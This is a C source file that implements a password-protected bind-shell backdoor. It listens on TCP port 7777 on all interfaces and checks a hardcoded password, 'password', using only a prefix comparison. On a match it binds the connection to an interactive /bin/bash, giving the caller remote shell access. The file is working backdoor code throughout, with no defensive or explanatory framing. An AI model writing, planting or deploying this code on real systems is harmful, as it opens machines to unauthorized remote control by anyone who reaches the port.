#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 7777
#define PASSWORD "password" // You should choose a stronger password

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char *password_prompt = "Password: ";
    
    // Creat socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    
    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    
    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    
    // Accept a connection
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0) {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    
    // Send password prompt and read the response
    send(new_socket, password_prompt, strlen(password_prompt), 0);
    read(new_socket, buffer, 1024);

    // Check password
    if (strncmp(buffer, PASSWORD, strlen(PASSWORD)) == 0) {
        // If correct, give shell access
        dup2(new_socket, 0);
        dup2(new_socket, 1);
        dup2(new_socket, 2);

        // Execute /bin/bash
        char *shell = "/bin/bash";
        char *args[] = {shell, "-i", NULL};
        execvp(shell, args);
    } else {
        // If incorrect, close connection
        char *msg = "Incorrect password.\n";
        send(new_socket, msg, strlen(msg), 0);
        close(new_socket);
    }

    return 0;
}
